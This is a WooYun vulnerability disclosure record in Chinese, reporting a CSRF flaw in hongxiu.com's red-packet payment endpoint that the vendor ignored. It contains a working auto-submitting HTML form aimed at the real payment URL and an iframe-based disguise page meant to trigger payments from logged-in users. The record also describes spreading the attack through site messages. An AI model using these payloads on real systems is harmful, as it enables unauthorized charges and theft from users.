{"id": 39263, "wybug_id": "wooyun-2015-094436", "wybug_title": "红袖添香的漏洞时代之CSRF（可刷钱）", "wybug_corp": "hongxiu.com", "wybug_author": "蛇精病", "wybug_date": "2015-01-29 11:43", "wybug_open_date": "2015-02-03 11:44", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-03：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 这几天看裸婚时代，发现一个问题——你连棒棒糖都没有，还跟我谈什么狗屁爱情~裸婚时代原来就是红袖添香出品的小说，今天我们一起来走进红袖添香的漏洞时代 详细说明：  红袖添香某处没验证，导致CSRF漏洞，攻击者可以利用此漏洞刷钱   漏洞证明：  1、我们打开任意一个作品，然后找到那个右下角有一个送荷包得月票（这个是作者跟晋江分成的）\n\n2、 我们用Burp 截断一下看看，发现没有任何验证~~，我们接下来构造一个表单\n\n3、构造表单如下\n<html>  <body>    <form id=\"post123\" name=\"post123\" action=\"http://novel.hongxiu.com/aspxnovel/framev3/upredpack.aspx\" method=\"POST\">      <input type=\"hidden\" name=\"txtExpense\" value=\"1\" />      <input type=\"hidden\" name=\"txtaid\" value=\"628281\" />      <input type=\"hidden\" name=\"txtbookname\" value=\"å&#191;&#131;é&#148;&#129;\" />      <input type=\"hidden\" name=\"txtauthorid\" value=\"6586411\" />      <input type=\"hidden\" name=\"txtauthorname\" value=\"å&#176;&#188;å&#141;&#161;\" />      <input type=\"hidden\" name=\"txtIv\" value=\"3\" />            <script>        document.getElementById('post123').submit();       </script    </form>  </body></html>\n这样用户打开这个链接的时候，就会自动支付，我们来看一下\n\n由于……我没充值，所以无法支付，但是如果是有这个余额的用户，肯定就会支付了的接下来谈一谈攻击，就跟我以前说过的攻击手法一样，如果直接发送这个页面过去，会有上图那样的提示，会被发现，但是如果我们弄一个iframe标签，然后伪装一个正常的页面，即可实现非常好的攻击环境假设我们，伪装的页面代码是这样的（随便写写，攻击者为了达到目的会写的跟正常页面一样）\n<html><table style=\"left: 0px; top: 0px; position: fixed;z-index: 5000;position:absolute;width:100%;height:300%;background-color: black;\"><tbody><tr><td style=\"color:#FFFFFF;z-index: 6000;vertical-align:top;\"><h1>CSRF测试 </h1></td></tr></tbody></table><!--设置这个伪造页面的文字内容--><meta http-equiv=\"refresh\" content=\"4;url=http://www.baidu.com/\"> <!--设置一个正常的跳转页面！--><title>CSRF测试</title><iframe src=\"http://127.0.0.1/cs.html\"></iframe><!--csrf攻击页面的地址！--></html>\n这段代码，就是先进入一个黑色覆盖的页面，然后又跳转到了百度。PS：这个漏洞虽然只是CSRF，但是个人感觉危害很大，因为涉及到刷月票什么的，而那个月票又是可以换RMB的，所以这个可以间接刷钱，还有本站有站内信，也没有过滤链接，攻击者是可以通过发送站内信的方式来实施攻击，而收到站内信的用户此时一定是登陆状态，正好符合CSRF的攻击环境   修复方案：  加token之类的验证机制   版权声明：转载请注明来源 蛇精病@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-02-03 11:44 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-04 21:45 |    \t\t蛇精病 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:10        | 你连棒棒糖都没有，还谈什么狗屁爱情？)\t\t \n  @xsser @疯狗  ……给忽略了……二位来看看 这算不算一个思路    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}